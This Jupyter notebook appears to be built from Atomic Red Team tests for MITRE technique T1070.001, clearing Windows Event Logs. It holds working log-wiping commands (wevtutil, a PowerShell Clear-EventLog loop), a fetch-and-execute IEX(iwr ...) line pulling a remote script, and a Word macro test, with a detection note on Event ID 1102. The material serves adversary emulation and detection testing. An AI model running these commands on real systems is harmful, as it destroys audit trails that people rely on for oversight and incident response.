{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "14fdfa52",
   "metadata": {},
   "source": "# T1070.001 - Clear Windows Event Logs\nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)"
  },
  {
   "cell_type": "markdown",
   "id": "20063a97",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "11f9a8c7",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Clear Logs",
    "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwevtutil cl System\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2954736a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f3e9bfc0",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Delete System Logs Using Clear-EventLog",
    "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77ef2557",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "7f720ff1",
   "metadata": {},
   "source": "### Atomic Test #3 - Clear Event Logs via VBA\nThis module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Word must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b3fc092",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "03820e5d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86487d29",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "ad29b1b0",
   "metadata": {},
   "source": "## Detection\nDeleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\")."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}